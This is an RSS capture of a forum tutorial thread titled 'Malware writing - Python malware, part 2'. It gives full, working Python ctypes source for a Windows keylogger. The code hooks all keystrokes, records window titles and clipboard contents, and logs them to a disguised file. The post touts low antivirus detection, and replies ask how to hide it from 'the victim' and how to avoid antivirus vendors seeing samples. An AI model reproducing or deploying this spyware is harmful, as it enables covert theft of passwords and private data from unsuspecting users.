<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</title>
    <link>https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858</link>
    <description># Malware writing series - Python Malware, part 2
Following @dtm&#39;s comment regarding  `GetAsyncKeyState` being responsible for the crazy CPU usage in part 1, I decided to follow his recommendation and use `SetWindowHookExA`. Initially, this was supposed to be a simple introduction to ctypes. I wasn&#39;t planning to write a second version of the keylogger with ctypes, but I changed my mind. Using `SetWindowHookExA` is much better and brought the CPU usage down two zero. But also, after searching for a keylogger fully written with ctypes, I couldn&#39;t find anything decent. Might as well make one.

Unfortunately it is much more complicated too. I tried multiple packages such as `keyboard` and `pynput` but both were very buggy and unreliable. Pynput couldn&#39;t print special characters such as +, -, %, ^, etc. Keyboard has a bug were, then typing too fast, letters are missing. The package also have over 100 unresolved issues. The only maintainer appears to have abandoned the project. PyHook is just not an option. There are unofficial packages but Python 3 but they don&#39;t contain bug fixes. The package is simply not reliable enough to use and will make the keylogger crash.

Therefore, I had no choice but to write everything from scratch.

So in this part, we&#39;ll rewrite the keylogger to use `SetWindowsHookEx`. It&#39;s going to be a lot more complicated but will give us a deeper understanding on how to use ctypes to interact with the WinAPI.

Let&#39;s start.

## Writing a keylogger in Python from scratch with ctypes

What is a hook? From MSDN: *&quot;A hook is a point in the system message-handling mechanism where an application can install a subroutine to monitor the message traffic in the system and process certain types of messages before they reach the target window procedure.&quot;*

In simple terms, you hit a key, the hook intercepts the keyboard event.

We start by importing the required packages, load `user32.dll` and `kernel32.dll`, set up logging and create the variables to hold the text, the windows titles and keys pressed.

```
from ctypes import *
from ctypes.wintypes import DWORD, LPARAM, WPARAM, MSG
import logging
import os

logging.basicConfig(filename=(os.environ[&#39;localappdata&#39;] +&quot;\\&quot; + &#39;applog.txt&#39;), level=logging.DEBUG, format=&#39;%(message)s&#39;)

# Load the required librairies
user32 = windll.user32
kernel32 = windll.kernel32


current_window = None   # Holds the current window title
current_clipboard = []  # Holds the current clipboard content
last_key = None         # Holds the last key pressed
line = &quot;&quot;               # Holds the lines of keyboard characters pressed
```

The hooking function we&#39;re going to use are `SetWindowsHookExA`, `UnhookWindowsHookEx` and `CallNextHookEx`. We also need a class to use as data structure to hold the data from keyboard input events received from the `KBDLLHOOKSTRUCT` struct.

First, we must declare some constants that will be required later when calling WinAPI functions.

```
WH_KEYBOARD_LL = 13     # Hook ID to pass to SetWindowsExA
WM_KEYDOWN = 0x0100     # VM_KEYDOWN message code
HC_ACTION = 0           # Parameter for KeyboardProc callback function
```
`SetWindowsHookExA` needs to know what type of hook it has to set. We need to pass the hook ID as first argument. In this case, we use `WH_KEYBOARD_LL` because, unlike `WH_KEYBOARD`, it does not require to inject a DLL in the processes and therefore is hard to catch.

`WM_KEYDOWN` tells us when a non-system key is pressed.

`HC_ACTION` is an argument to pass to the `KeyboardProc` callback functions.

After, we have to map the virtual keys to their respective hex values and create the `HOOKPROC` callback function. Then we create a pointer that points to the callback function. This pointer is later passed as argument to `SetWindowsHookExA`.

```
# VIRTUAL KEYS CODES: Needed to handle special keys such as CTRL or RETURN
# Reference: http://nehe.gamedev.net/article/msdn_virtualkey_codes/15009/
VIRTUAL_KEYS = {&#39;RETURN&#39;: 0x0D,
                &#39;CONTROL&#39;: 0x11,
                &#39;SHIFT&#39;: 0x10,
                &#39;MENU&#39;: 0x12,
                &#39;TAB&#39;: 0x09,
                &#39;BACKSPACE&#39;: 0x08,
                &#39;CLEAR&#39;: 0x0C,
                &#39;CAPSLOCK&#39;: 0x14,
                &#39;ESCAPE&#39;: 0x1B,
                &#39;HOME&#39;: 0x24,
                &#39;INS&#39;: 0x2D,
                &#39;DEL&#39;: 0x2E,
                &#39;END&#39;: 0x23,
                &#39;PRINTSCREEN&#39;: 0x2C,
                &#39;CANCEL&#39;: 0x03
                }

HOOKPROC = WINFUNCTYPE(HRESULT, c_int, WPARAM, LPARAM) # Callback function
```

The virtual keys are needed to detect special keys pressed such as ENTER, SHIFT, etc. I did not include all of them, because the list is extensive but you can add more if you wish to log more. Just visit the reference in the code, above the variable name, to get all the hex values.

We use the `WINFUNCTYPE` factory ctypes function to create the `HOOKPROC` callback function.

Then, we need a data structure to hold information about the keyboard input events. We just need to replicate the structure provided by MSDN here: https://docs.microsoft.com/en-us/windows/desktop/api/winuser/ns-winuser-tagkbdllhookstruct

```
class KBDLLHOOKSTRUCT(Structure): _fields_=[ 
    (&#39;vkCode&#39;,DWORD),
    (&#39;scanCode&#39;,DWORD),
    (&#39;flags&#39;,DWORD),
    (&#39;time&#39;,DWORD),
    (&#39;dwExtraInfo&#39;,DWORD)]
```

Now we have everything we need to start! This time, we will make a class named `hook` that will monitor the keyboard events by installing a hook.

```
class hook:
    &quot;&quot;&quot;
    Class for installing/uninstalling a hook
    &quot;&quot;&quot;

    def __init__(self):
        &quot;&quot;&quot;
        Constructor for the hook class.

        Responsible for allowing methods to call functions from
        user32.dll and kernel32.dll.
        &quot;&quot;&quot;
        self.user32 = user32
        self.kernel32 = kernel32
        self.is_hooked = None


    def install_hook(self, ptr):
        &quot;&quot;&quot;
        Method for installing hook.

        Arguments
            ptr: pointer to the HOOKPROC callback function
        &quot;&quot;&quot;
        self.is_hooked = self.user32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            ptr,
            kernel32.GetModuleHandleW(None),
            0
        )

        if not self.is_hooked:
            return False
        return True

    def uninstall_hook(self):
        &quot;&quot;&quot;
        Method for uninstalling the hook.
        &quot;&quot;&quot;

        if self.is_hooked is None:
            return
        self.user32.UnhookWindowsHookEx(self.is_hooked)
        self.is_hooked = None

```

We need to start with the constructor that will allow methods to call `user32.dll` and `kernel32.dll` functions. We also need to declare the variable `is_hooked` that will hold the handle to the hook procedure returned by `SetWindowsHookExA`.

We then proceed with creating the method `install_hook` that, as the name says, will install the hook calling `SetWindowsHookExA`, passing the hook ID (type of hook) and the pointer to the callback function as argument. The returned value is the handle to the hook procedure that we store in `is_hooked`.

Finally, we create the function `uninstall_hook` (optional) to uninstall the hook. Useful when testing the keylogger.

Then, we take our previously written `get_current_window()` and `get_clipboard()` functions from Part 1.

```
def get_current_window(): # Function to grab the current window and its title

    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLengthW
    GetWindowText = user32.GetWindowTextW

    hwnd = GetForegroundWindow() # Get handle to foreground window
    length = GetWindowTextLength(hwnd) # Get length of the window text in title bar
    buff = create_unicode_buffer(length + 1) # Create buffer to store the window title string
    
    GetWindowText(hwnd, buff, length + 1) # Get window title and store in buff

    return buff.value # Return the value of buff

def get_clipboard():
    
    CF_TEXT = 1 # Set clipboard format

    # Argument and return types for GlobalLock/GlobalUnlock.
    kernel32.GlobalLock.argtypes = [c_void_p]
    kernel32.GlobalLock.restype = c_void_p
    kernel32.GlobalUnlock.argtypes = [c_void_p]

    # Return type for GetClipboardData
    user32.GetClipboardData.restype = c_void_p
    user32.OpenClipboard(0)
    
    # Required clipboard functions
    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    GetClipboardData = user32.GetClipboardData
    CloseClipboard = user32.CloseClipboard

    try:
        if IsClipboardFormatAvailable(CF_TEXT): # If CF_TEXT is available
            data = GetClipboardData(CF_TEXT) # Get handle to data in clipboard
            data_locked = kernel32.GlobalLock(data) # Get ptr to memory location where the data is located
            text = c_char_p(data_locked) # Get a char * ptr (string in Python) to the location of data_locked
            value = text.value # Dump the content in value
            kernel32.GlobalUnlock(data_locked) # Decrement de lock count
            return value.decode(&#39;latin1&#39;) # Return the clipboard content
    finally:
        CloseClipboard() # Close the clipboard
```

Now it&#39;s time to write the hook procedure that this called every time a keyboard event occurs.

```
def hook_procedure(nCode, wParam, lParam):

    # Need to be global so they&#39;re not emptied at every key pressed
    global last_key
    global current_clipboard
    global line
    global current_window
```

We have to specify to the function that the variables we previously created are global and that they can be accessed by this function. The reason why we can&#39;t use local variables is that, whenever a key is pressed, the `hook_procedure` function is executed and therefore, the local variables will be cleared at every key pressed. That&#39;s not very useful if we want to use them to compared the last key, last window or last clipboard data.

Then, like in Part 1, we need to know what is the current window opened when the user is typing so we have some context and know how to use the data we retrieve.

```
    if current_window != get_current_window():
        current_window = get_current_window()
        logging.info(&#39;[WINDOW] &#39; + current_window)
    
    
    # Remove comments below if you want to the possibility to uninstall the hook when testing.
    &quot;&quot;&quot;
    if user32.GetKeyState(VIRTUAL_KEYS[&#39;CONTROL&#39;]) &amp; 0x8000:
        hook.uninstall_hook()
        return 0
    &quot;&quot;&quot;
```

Optionally, we can use a function to uninstall the hook whenever a specific key is pressed (CONTROL here). Now we can start writing the keylogging routine triggered at every key pressed.

```
    if nCode == HC_ACTION and wParam == WM_KEYDOWN:

        kb = KBDLLHOOKSTRUCT.from_address(lParam)
        user32.GetKeyState(VIRTUAL_KEYS[&#39;SHIFT&#39;])
        user32.GetKeyState(VIRTUAL_KEYS[&#39;MENU&#39;])
        state = (c_char * 256)()
        user32.GetKeyboardState(byref(state))
        buff = create_unicode_buffer(8)
        n = user32.ToUnicode(kb.vkCode, kb.scanCode, state, buff, 8 - 1, 0)
        key = wstring_at(buff)     # Key pressed as buffer
```

The logic here is that, when a key is pressed, we use `from_address` to take the information about the keyboard event and store it in the `kb` variable as a data structure, using the previously created `KBDLLHOOKSTRUCT` class. The we create a `state` variable of size 256 to hold the state of all 256 virtual keys. This is done by calling the `GetKeyboardState()` function.

Then, we declare a `buff` variable to create a unicode character buffer (an array of values with the `wchar` datatype). We then use `ToUnicode` function from `user32.dll` to translate the virtual key code or keyboard state to a unicode character, and the `wstring_at()` function to store the characters as 1-character unicode string.

ToUnicode can return one of four values: 1, a dead key, 0, for which there is no translation, - 1, a character and - 2 ≤ value, two or more characters.

The returned value is being stored in `n`. So every time a key is pressed, the hook procedure stores the return value and we can use this to determine whether or not we want to log the character or not. As long as `n` is larger than 0, we want to log the key pressed.

```
        if n &gt; 0:

            # Avoid logging weird characters. If they show up,
            # get the hex code here http://asciivalue.com/index.php
            # and add to VIRTUAL_KEYS
            if kb.vkCode not in VIRTUAL_KEYS.values():
                line += key

            for key, value in VIRTUAL_KEYS.items(): 
                if kb.vkCode == value:
                    logging.info(key)

            if kb.vkCode == VIRTUAL_KEYS[&#39;RETURN&#39;]:
                logging.info(line)
                line = &quot;&quot;

            if current_clipboard != get_clipboard():
                current_clipboard = get_clipboard()
                logging.info(&#39;[CLIPBOARD] &#39; + current_clipboard + &#39;\n&#39;)

    return user32.CallNextHookEx(hook.is_hooked, nCode, wParam, c_ulonglong(lParam))
```

The rest is pretty simple. We start by logging any key. The key is appended to the `line` variable to create a full, easily readable line.

Then, if `RETURN` is pressed, we log the line and clear the `line` variable.

Finally, we check the current status of the clipboard. If there is new data in the clipboard, we log that data. Then we pass the hook information to the next hook procedure with `CallNextHookEx`. And it continues again and again.

That&#39;s about it! All we have to do is:
    - Create an instance of the `hook()` class
    - Create the pointer with `ptr`
    - Install the hook with `install_hook(ptr)`
    - Wait for system messages to be intercepted by the hook
```
hook = hook()                           # Hook class
ptr = HOOKPROC(hook_procedure)          # Pointer to the callback function
hook.install_hook(ptr)                  # Installing hook
msg = MSG()
user32.GetMessageA(byref(msg), 0, 0, 0)
```

Look at that CPU usage!
![image|690x36](upload://qyq5FmfyFH3ui7bvhLxdFojtSIh.png) 

Look at that detection rate!
![image|690x241](upload://b3JFWZupPjyRSbyldLzEaX6MJ2i.png) 
https://www.virustotal.com/#/file/7b0a3c98ca34e62b9057c6abd8071887937a9d9140d1d0eca67da7559ab69a39/detection

I don&#39;t know who the fuck uses Jiangmin anyway.

There&#39;s one issue I am working on at the moment and I&#39;ll update the code and the post when I find a solution. PyInstaller seems to have poor support for either ctypes or the logging library. Therefore, it creates the file on disk at execution but isn&#39;t writing in it. I&#39;m currently looking and testing alternatives and will update accordingly.

There are other ways to build a standalone executable but we will cover these later. PyInstaller is my favorite because I use it for many other things, therefore I really want to find a solution! 

In part 3, we will look at how to dump credentials with standard user privileges. This time it&#39;s going to be a lot simpler. We will use PyWin32 so it&#39;s unlikely that we&#39;ll have to write any WinAPI calls from scratch. I don&#39;t even think we&#39;ll need ctypes period.

You&#39;ll find the complete keylogger code below and here: https://github.com/tr4cefl0w/0x00sec/tree/master/python-malware

Thanks to @dtm for the tip and to that guy on HackerThreads showing how create a hook with Python (kind of).

```
# KEYLOGGER WITH CTYPES AND SETWINDOWSHOOKEX FROM MY 0X00SEC POST.
# THIS IS A PROOF-OF-CONCEPT AND I AM NOT RESPONSIBLE FOR ANY 
# USAGE OF THIS CODE OR MALICIOUS PURPOSE.

from ctypes import *
from ctypes.wintypes import DWORD, LPARAM, WPARAM, MSG
import logging
import os

logging.basicConfig(filename=(os.environ[&#39;localappdata&#39;] +&quot;\\&quot; + &#39;applog.txt&#39;), 
                    level=logging.DEBUG, format=&#39;%(message)s&#39;)

# Load the required librairies
user32 = windll.user32
kernel32 = windll.kernel32


current_window = None   # Holds the current window title
current_clipboard = []  # Holds the current clipboard content
last_key = None         # Holds the last key pressed
line = &quot;&quot;               # Holds the lines of keyboard characters pressed


WH_KEYBOARD_LL = 13     # Hook ID to pass to SetWindowsExA
WM_KEYDOWN = 0x0100     # VM_KEYDOWN message code
HC_ACTION = 0           # Parameter for KeyboardProc callback function

# VIRTUAL KEYS CODES: Needed to handle special keys such as CTRL or RETURN
# Reference: http://nehe.gamedev.net/article/msdn_virtualkey_codes/15009/
VIRTUAL_KEYS = {&#39;RETURN&#39;: 0x0D,
                &#39;CONTROL&#39;: 0x11,
                &#39;SHIFT&#39;: 0x10,
                &#39;MENU&#39;: 0x12,
                &#39;TAB&#39;: 0x09,
                &#39;BACKSPACE&#39;: 0x08,
                &#39;CLEAR&#39;: 0x0C,
                &#39;CAPSLOCK&#39;: 0x14,
                &#39;ESCAPE&#39;: 0x1B,
                &#39;HOME&#39;: 0x24,
                &#39;INS&#39;: 0x2D,
                &#39;DEL&#39;: 0x2E,
                &#39;END&#39;: 0x23,
                &#39;PRINTSCREEN&#39;: 0x2C,
                &#39;CANCEL&#39;: 0x03,
                &#39;BACK&#39;: 0x08,
                &#39;LBUTTON&#39;: 0x01
                }

HOOKPROC = WINFUNCTYPE(HRESULT, c_int, WPARAM, LPARAM) # Callback function

class KBDLLHOOKSTRUCT(Structure): _fields_=[ 
    (&#39;vkCode&#39;,DWORD),
    (&#39;scanCode&#39;,DWORD),
    (&#39;flags&#39;,DWORD),
    (&#39;time&#39;,DWORD),
    (&#39;dwExtraInfo&#39;,DWORD)]

class hook:
    &quot;&quot;&quot;
    Class for installing/uninstalling a hook
    &quot;&quot;&quot;

    def __init__(self):
        &quot;&quot;&quot;
        Constructor for the hook class.

        Responsible for allowing methods to call functions from
        user32.dll and kernel32.dll.
        &quot;&quot;&quot;
        self.user32 = user32
        self.kernel32 = kernel32
        self.is_hooked = None


    def install_hook(self, ptr):
        &quot;&quot;&quot;
        Method for installing hook.

        Arguments
            ptr: pointer to the HOOKPROC callback function
        &quot;&quot;&quot;
        self.is_hooked = self.user32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            ptr,
            kernel32.GetModuleHandleW(None),
            0
        )

        if not self.is_hooked:
            return False
        return True

    def uninstall_hook(self):
        &quot;&quot;&quot;
        Method for uninstalling the hook.
        &quot;&quot;&quot;

        if self.is_hooked is None:
            return
        self.user32.UnhookWindowsHookEx(self.is_hooked)
        self.is_hooked = None


def get_current_window(): # Function to grab the current window and its title

    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLengthW
    GetWindowText = user32.GetWindowTextW

    hwnd = GetForegroundWindow() # Get handle to foreground window
    length = GetWindowTextLength(hwnd) # Get length of the window text in title bar
    buff = create_unicode_buffer(length + 1) # Create buffer to store the window title buff
    
    GetWindowText(hwnd, buff, length + 1) # Get window title and store in buff

    return buff.value # Return the value of buff

def get_clipboard():
    
    CF_TEXT = 1 # Set clipboard format

    # Argument and return types for GlobalLock/GlobalUnlock.
    kernel32.GlobalLock.argtypes = [c_void_p]
    kernel32.GlobalLock.restype = c_void_p
    kernel32.GlobalUnlock.argtypes = [c_void_p]

    # Return type for GetClipboardData
    user32.GetClipboardData.restype = c_void_p
    user32.OpenClipboard(0)
    
    # Required clipboard functions
    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    GetClipboardData = user32.GetClipboardData
    CloseClipboard = user32.CloseClipboard

    try:
        if IsClipboardFormatAvailable(CF_TEXT): # If CF_TEXT is available
            data = GetClipboardData(CF_TEXT) # Get handle to data in clipboard
            data_locked = kernel32.GlobalLock(data) # Get ptr to memory location where the data is located
            text = c_char_p(data_locked) # Get a char * ptr (buff in Python) to the location of data_locked
            value = text.value # Dump the content in value
            kernel32.GlobalUnlock(data_locked) # Decrement de lock count
            return value.decode(&#39;latin1&#39;) # Return the clipboard content
    finally:
        CloseClipboard() # Close the clipboard

def hook_procedure(nCode, wParam, lParam):
    &quot;&quot;&quot;
    Hook procedure to monitor and log keyboard events.

    Arguments:
        nCode       = HC_ACTION code
        wParam      = Keyboard event message code
        lParam      = Address of keyboard input event

    &quot;&quot;&quot;

    # Need to be global so they&#39;re not emptied at every key pressed
    global last_key
    global current_clipboard
    global line
    global current_window

    if current_window != get_current_window():
        current_window = get_current_window()
        logging.info(&#39;[WINDOW] &#39; + current_window)
    
    
    # Remove comments below if you want to the possibility to uninstall the hook when testing.
    &quot;&quot;&quot;
    if user32.GetKeyState(VIRTUAL_KEYS[&#39;CONTROL&#39;]) &amp; 0x8000:
        hook.uninstall_hook()
        return 0
    &quot;&quot;&quot;

    if nCode == HC_ACTION and wParam == WM_KEYDOWN:

        kb = KBDLLHOOKSTRUCT.from_address(lParam)
        user32.GetKeyState(VIRTUAL_KEYS[&#39;SHIFT&#39;])
        user32.GetKeyState(VIRTUAL_KEYS[&#39;MENU&#39;])
        state = (c_char * 256)()
        user32.GetKeyboardState(byref(state))
        buff = create_unicode_buffer(8)
        n = user32.ToUnicode(kb.vkCode, kb.scanCode, state, buff, 8 - 1, 0)
        key = wstring_at(buff)     # Key pressed as buffer
        if n &gt; 0:

            # Avoid logging weird characters. If they show up,
            # get the hex code here http://asciivalue.com/index.php
            # and add to VIRTUAL_KEYS
            if kb.vkCode not in VIRTUAL_KEYS.values():
                line += key

            for key, value in VIRTUAL_KEYS.items(): 
                if kb.vkCode == value:
                    logging.info(key)

            if kb.vkCode == VIRTUAL_KEYS[&#39;RETURN&#39;]:
                logging.info(line)
                line = &quot;&quot;

            if current_clipboard != get_clipboard():
                current_clipboard = get_clipboard()
                logging.info(&#39;[CLIPBOARD] &#39; + current_clipboard + &#39;\n&#39;)

    return user32.CallNextHookEx(hook.is_hooked, nCode, wParam, c_ulonglong(lParam))

hook = hook()                           # Hook class
ptr = HOOKPROC(hook_procedure)          # Pointer to the callback function
hook.install_hook(ptr)                  # Installing hook
msg = MSG()                             # MSG data structure
user32.GetMessageA(byref(msg), 0, 0, 0) # Wait for messages to be posted

```

**EDIT 1:** Added support for special characters and removed a sentence related to that issue.
**EDIT 2:** Fixed some typos
**EDIT 3:** Changed the link to the Github repo as the structure changed.
**EDIT 4:** Fixed typo in code snippet.
References:
http://www.hackerthreads.org/Topic-42395
https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-callnexthookex
https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-tounicode
https://docs.microsoft.com/en-us/windows/desktop/inputdev/wm-keydown
https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-setwindowshookexa
https://docs.microsoft.com/en-us/windows/desktop/api/winuser/ns-winuser-tagmsg
http://www.winprog.org/tutorial/message_loop.html</description>
    
    <lastBuildDate>Tue, 12 Mar 2019 15:31:36 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/14">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/14</link>
        <pubDate>Wed, 27 Mar 2019 03:02:21 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11858-14</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858.rss">Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <p>Hey thanks for reporting the typo. It’s fixed.</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/13">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/13</link>
        <pubDate>Tue, 12 Mar 2019 15:31:36 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11858-13</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858.rss">Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</title>
        <dc:creator><![CDATA[CaasiNewton]]></dc:creator>
        <description><![CDATA[
            <p>Hi guys, I read in some places not to put files in the virustotal because it divulges the information with some companies of antivirus and some antivirus that does not recognize the malware / trojan begin to identify. I always post on <a href="http://www.nodistribute.com/" rel="nofollow noopener">http://www.nodistribute.com/</a>.<br>
I would like to know the members here, because I have already seen some posts of members uploading in Virustotal.</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/12">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/12</link>
        <pubDate>Tue, 12 Mar 2019 11:53:15 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11858-12</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858.rss">Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</title>
        <dc:creator><![CDATA[zz0eyu]]></dc:creator>
        <description><![CDATA[
            <p>Find a typo here<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a5149bc60b73b18bef14b1a94eb5f76e4d9c9251.png" alt="%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20190312124828" data-base62-sha1="nymW2pDp6FuriSBlCvMdmVteeZj" width="690" height="303"></p>
<p>and what’s the use of these two lines of code?</p>
<aside class="quote no-group quote-modified" data-username="tr4cefl0w" data-post="1" data-topic="11858">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/letter_avatar_proxy/v4/letter/t/c2a13f/40.png" class="avatar"> tr4cefl0w:</div>
<blockquote>
<p>user32.GetKeyState(VIRTUAL_KEYS[‘SHIFT’])<br>
user32.GetKeyState(VIRTUAL_KEYS[‘MENU’])</p>
</blockquote>
</aside>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/11</link>
        <pubDate>Tue, 12 Mar 2019 04:51:40 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11858-11</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858.rss">Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</title>
        <dc:creator><![CDATA[xXxH4CK0RxXx]]></dc:creator>
        <description><![CDATA[
            <p>thanks, also I ran the file and it didn’t let me type anything so I had to restart my computer and delete the program, it still logged it though.</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/10</link>
        <pubDate>Sun, 03 Mar 2019 13:15:18 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11858-10</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858.rss">Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <p>That will be covered in a later part.</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/9</link>
        <pubDate>Sun, 03 Mar 2019 00:05:06 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11858-9</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858.rss">Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</title>
        <dc:creator><![CDATA[BrokenAdministrator]]></dc:creator>
        <description><![CDATA[
            <p>I’ve written a batch file for “installing” my malware on the user’s system. It hides the folders and does the first parts of work for me.</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/8</link>
        <pubDate>Sat, 02 Mar 2019 22:21:18 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11858-8</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858.rss">Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</title>
        <dc:creator><![CDATA[xXxH4CK0RxXx]]></dc:creator>
        <description><![CDATA[
            <p>what about making it hidden from the victim? what code should we put and where?</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/7</link>
        <pubDate>Sat, 02 Mar 2019 20:35:47 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11858-7</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858.rss">Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</title>
        <dc:creator><![CDATA[Djimbu]]></dc:creator>
        <description><![CDATA[
            <p>You;re the man dude, thank you.  Love your project btw</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/6</link>
        <pubDate>Thu, 28 Feb 2019 21:51:01 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11858-6</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858.rss">Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <p>My guess is that you’re using Python 3.x 32-bit instead of 64-bit. Are you running Windows 10 32-bit? Else, use Python 64-bit. Because I’m developing on 64-bit, I typecast <code>1Param</code> as <code>c_ulonglong</code>. You just have to change it to <code>c_ulong</code> and it should work.</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/5">Read full topic</a></p>
        ]]></description>
